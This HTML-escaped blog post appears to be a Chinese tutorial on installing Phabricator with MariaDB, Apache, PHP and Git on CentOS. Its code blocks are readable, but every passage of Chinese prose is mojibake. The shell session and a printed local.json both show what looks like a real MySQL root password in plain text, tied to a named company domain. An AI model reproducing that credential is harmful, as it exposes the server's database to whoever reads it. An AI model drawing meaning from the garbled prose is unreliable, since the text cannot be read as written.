&lt;h5 id=&quot;éœ€è¦æ‰§è¡Œçš„SQLè¯­å¥ï¼š&quot;&gt;&lt;a href=&quot;#éœ€è¦æ‰§è¡Œçš„SQLè¯­å¥ï¼š&quot; class=&quot;headerlink&quot; title=&quot;éœ€è¦æ‰§è¡Œçš„SQLè¯­å¥ï¼š&quot;&gt;&lt;/a&gt;éœ€è¦æ‰§è¡Œçš„SQLè¯­å¥ï¼š&lt;/h5&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@Phabricator sql]&lt;span class=&quot;comment&quot;&gt;# mysql -uroot -pqwde1dsdfg3.com&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Welcome to the MariaDB monitor.  Commands end with ; or \g.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Your MariaDB connection id is 75&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Server version: 5.5.52-MariaDB MariaDB Server&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Copyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Type &lt;span class=&quot;string&quot;&gt;&#39;help;&#39;&lt;/span&gt; or &lt;span class=&quot;string&quot;&gt;&#39;\h&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; help. Type &lt;span class=&quot;string&quot;&gt;&#39;\c&#39;&lt;/span&gt; to clear the current input statement.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;MariaDB [(none)]&amp;gt; REPAIR TABLE phabricator_search.search_documentfield;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+-----------------------------------------+--------+----------+----------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| Table                                   | Op     | Msg_type | Msg_text |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+-----------------------------------------+--------+----------+----------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_search.search_documentfield | repair | status   | OK       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+-----------------------------------------+--------+----------+----------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;1 row &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; (0.00 sec)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;mysql 5.6å®‰è£…ï¼Œä¸è¿‡è¿™é‡Œæˆ‘æœ€åå¯ç”¨çš„æ˜¯5.6ç‰ˆæœ¬ï¼ŒåŸå› å·²ç»è¯´æ˜äº†.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;2-å®‰è£…Apache&quot;&gt;&lt;a href=&quot;#2-å®‰è£…Apache&quot; class=&quot;headerlink&quot; title=&quot;2 å®‰è£…Apache&quot;&gt;&lt;/a&gt;2 å®‰è£…Apache&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ï¼ƒyum -y install httpd&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;é…ç½®Apacheï¼Œæé«˜ä¸€ç‚¹å®‰å…¨æ€§ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&#39;s/^/#&amp;amp;/g&#39;&lt;/span&gt; /etc/httpd/conf.d/welcome.conf  &lt;span class=&quot;comment&quot;&gt;# æ³¨é‡Šæ‰æ¯ä¸€è¡Œ&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&quot;s/Options Indexes FollowSymLinks/Options FollowSymLinks/&quot;&lt;/span&gt; /etc/httpd/conf/httpd.conf&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¯åŠ¨Apache webæœåŠ¡ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;systemctl start httpd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;systemctl &lt;span class=&quot;built_in&quot;&gt;enable&lt;/span&gt; httpd&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;3-å®‰è£…PHPå’Œä¸€äº›æ¨¡å—&quot;&gt;&lt;a href=&quot;#3-å®‰è£…PHPå’Œä¸€äº›æ¨¡å—&quot; class=&quot;headerlink&quot; title=&quot;3 å®‰è£…PHPå’Œä¸€äº›æ¨¡å—&quot;&gt;&lt;/a&gt;3 å®‰è£…PHPå’Œä¸€äº›æ¨¡å—&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;yum install php php-mysqli php-mbstring php-gd php-curl php-cli php-common php-process&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;é…ç½®ä¼˜åŒ– ä¸ç„¶å®‰è£…æˆåŠŸä»¥åä¼šå‡ºç°é—®é¢˜é”™è¯¯æç°âŒï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1. æœªé…ç½®æœåŠ¡å™¨æ—¶åŒº  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@Phabricator sql]&lt;span class=&quot;comment&quot;&gt;# vim /etc/php.ini&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ä¾‹ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;;date.timezone = &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ”¹æˆ: &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;date.timezone = Asia/Shanghai &lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PHP post_max_sizeæœªé…ç½® &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;å°†PHP é…ç½®ä¸­çš„post_max_size è°ƒæ•´ä¸ºè‡³å°‘32MBã€‚è®¾ç½®ä¸ºè¾ƒå°å€¼æ—¶ï¼Œå¤§æ–‡ä»¶ä¸Šä¼ å¯èƒ½æ— æ³•æ­£å¸¸å·¥ä½œã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;post_max_size = 32M&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;php5.4ç‰ˆæœ¬å¯ä»¥ç›´æ¥ä½¿ç”¨&lt;a href=&quot;https://secure.phabricator.com/diffusion/P/browse/master/scripts/install/install_rhel-derivs.sh&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;phabricator.sh&lt;/a&gt;æä¾›çš„è„šæœ¬å®‰è£…ï¼Œè¿™ä¸ªè„šæœ¬ä¼šæ£€æŸ¥&lt;code&gt;phabricator&lt;/code&gt;éœ€è¦çš„ç¯å¢ƒï¼Œæ²¡æœ‰çš„ä¼šè‡ªåŠ¨å®‰è£…ï¼Œä¹‹åä¼šå®‰è£…å¥½phabricatorï¼Œå®‰è£…å‚è€ƒ&lt;a href=&quot;https://my.oschina.net/yoyoko/blog/126325&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;phabricator&lt;/a&gt;å®‰è£…å‘å¯¼.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;4-å®‰è£…Git&quot;&gt;&lt;a href=&quot;#4-å®‰è£…Git&quot; class=&quot;headerlink&quot; title=&quot;4 å®‰è£…Git&quot;&gt;&lt;/a&gt;4 å®‰è£…Git&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;yum install git&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¯å‚è€ƒç½‘ä¸Šé˜²ç«å¢™å’Œselinuxå»ºè®®æ ¹æ®æ­¤æ–‡ç« é…ç½®ä¸€ä¸‹.&lt;/p&gt;
&lt;p&gt;å¦‚æœä½ å·²ç»è®¾ç½®å¥½LAMPç¯å¢ƒï¼Œä½ å¯ä»¥å·²ç»è·å¾—ä½ æ‰€éœ€çš„ä»»ä½•ä¸œä¸œã€‚å¦‚ä½•å®‰è£…LAMPå¯ä»¥æŸ¥çœ‹æˆ‘å†™&lt;a href=&quot;http://blog.yangcvo.me/2014/12/07/Linux%E7%AC%94%E8%AE%B0/LAMP/yum%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E4%B8%8E%E5%8D%B8%E8%BD%BDLAMP%E7%8E%AF%E5%A2%83/&quot;&gt;yumä¸€é”®å®‰è£…ä¸å¸è½½LAMPç¯å¢ƒ&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;5-ä¸‹è½½å®‰è£…Phabricator&quot;&gt;&lt;a href=&quot;#5-ä¸‹è½½å®‰è£…Phabricator&quot; class=&quot;headerlink&quot; title=&quot;5 ä¸‹è½½å®‰è£…Phabricator&quot;&gt;&lt;/a&gt;5 ä¸‹è½½å®‰è£…Phabricator&lt;/h3&gt;&lt;p&gt;æ—¢ç„¶ä½ å·²ç»å®‰è£…ä»¥ä¸Šæ‰€éœ€çš„ä¾èµ–ç¯å¢ƒæœåŠ¡ï¼Œä¸‹é¢è·å–Phabricatorä»¥åŠå…¶ä¾èµ–åŒ…ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;mkdir /var/www/html/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; /var/www/html/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/phacility/libphutil.git&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/phacility/arcanist.git&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/phacility/phabricator.git&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;chown -R apache: /var/www/html/*&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;6-åˆ›å»ºApacheè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶&quot;&gt;&lt;a href=&quot;#6-åˆ›å»ºApacheè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶&quot; class=&quot;headerlink&quot; title=&quot;6 åˆ›å»ºApacheè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶&quot;&gt;&lt;/a&gt;6 åˆ›å»ºApacheè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;vim /etc/httpd/conf.d/phabricator.conf&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å†™å…¥å†…å®¹ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;VirtualHost *:80&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ServerAdmin phabricator.ihaozhuo.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DocumentRoot /var/www/html/phabricator/webroot/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ServerName phabricator.ihaozhuo.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ServerAlias phabricator.ihaozhuo.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    RewriteEngine on&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    RewriteRule ^/rsrc/(.*)     -                       [L,QSA]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    RewriteRule ^/favicon.ico   -                       [L,QSA]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    RewriteRule ^(.*)$          /index.php?__path__=&lt;span class=&quot;variable&quot;&gt;$1&lt;/span&gt;  [B,L,QSA]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;Directory /var/www/html/phabricator/webroot/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        AllowOverride All&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;/Directory&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ErrorLog /var/&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/httpd/phabricator.ihaozhuo.com-error_log&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    CustomLog /var/&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/httpd/phabricator.ihaozhuo.com-access_log common&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/VirtualHost&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;â—ï¸â—ï¸æ³¨æ„æ›¿æ¢ä¸Šé¢çš„åŸŸåã€‚&lt;br&gt;å…¶ä¸­&lt;code&gt;/var/www/html/phabricator/webroot&lt;/code&gt;æ˜¯æˆ‘çš„&lt;code&gt;phabricator&lt;/code&gt;å®‰è£…è·¯å¾„ï¼Œå¤§å®¶ä½¿ç”¨æ—¶å€™æ¢æˆè‡ªå·±çš„å³å¯ã€‚&lt;br&gt;å®‰è£…å¥½phabricatorä¹‹åï¼Œéœ€è¦ä½¿ç”¨phabricatorå®‰è£…ç›®å½•ä¸‹binæ–‡ä»¶å¤¹ä¸‹çš„å‘½ä»¤æ¥æ›´æ–°ä¸‹.&lt;/p&gt;
&lt;h3 id=&quot;é‡å¯apacheæœåŠ¡ï¼š&quot;&gt;&lt;a href=&quot;#é‡å¯apacheæœåŠ¡ï¼š&quot; class=&quot;headerlink&quot; title=&quot;é‡å¯apacheæœåŠ¡ï¼š&quot;&gt;&lt;/a&gt;é‡å¯apacheæœåŠ¡ï¼š&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;systemctl restart httpd&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;7-è®¾ç½®MariaDBæ•°æ®åº“&quot;&gt;&lt;a href=&quot;#7-è®¾ç½®MariaDBæ•°æ®åº“&quot; class=&quot;headerlink&quot; title=&quot;7 è®¾ç½®MariaDBæ•°æ®åº“&quot;&gt;&lt;/a&gt;7 è®¾ç½®MariaDBæ•°æ®åº“&lt;/h3&gt;&lt;p&gt;é…ç½®Phabricatorè¿æ¥MariaDBéœ€è¦çš„ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight gams&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;cd /var/www/html/phabricator/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./bin/config &lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; mysql.host &lt;span class=&quot;comment&quot;&gt;localhost&lt;/span&gt;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./bin/config &lt;span class=&quot;comment&quot;&gt;set mysql.port 3306&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./bin/config &lt;span class=&quot;comment&quot;&gt;set mysql.user root&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./bin/config &lt;span class=&quot;comment&quot;&gt;set mysql.pass &amp;lt;your-MySQL-root-password&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;åˆ›å»ºæ•°æ®åº“ï¼š&quot;&gt;&lt;a href=&quot;#åˆ›å»ºæ•°æ®åº“ï¼š&quot; class=&quot;headerlink&quot; title=&quot;åˆ›å»ºæ•°æ®åº“ï¼š&quot;&gt;&lt;/a&gt;åˆ›å»ºæ•°æ®åº“ï¼š&lt;/h3&gt;&lt;p&gt;å‡ºç°é—®é¢˜ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@phabricator bin]&lt;span class=&quot;comment&quot;&gt;# ./storage upgrade&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;MySQL Credentials Not Configured&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Unable to connect to MySQL using the configured credentials. You must&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;configure standard credentials before you can upgrade storage. Run these&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;commands to &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; up credentials:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  phabricator/ $ ./bin/config &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; mysql.host __host__&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  phabricator/ $ ./bin/config &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; mysql.user __username__&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  phabricator/ $ ./bin/config &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; mysql.pass __password__&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;These standard credentials are separate from any administrative credentials&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;provided to this &lt;span class=&quot;built_in&quot;&gt;command&lt;/span&gt; with __--user__ or __--password__, and must be&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;configured correctly before you can proceed.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Raw MySQL Error: Attempt to connect to root@localhost failed with error&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#2002: Can&#39;t connect to local MySQL server through socket&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;/var/lib/mysql/mysql.sock&#39;&lt;/span&gt; (2).&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å‡ºç°è¿™ä¸€æ­¥é—®é¢˜ å°±æ˜¯å› ä¸ºæ²¡æœ‰é…ç½®å¥½MySQLçš„è¿æ¥åœ°å€ä¿¡æ¯ã€‚é…ç½®ä¸‹mysqlçš„userå’Œpasså°±è¡Œã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@Phabricator &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;]&lt;span class=&quot;comment&quot;&gt;#  cat /var/www/html/phabricator/conf/local/local.json&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;mysql.pass&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;qwde1dsdfg3.com&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;mysql.user&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;root&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;mysql.port&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;3306&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;mysql.host&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
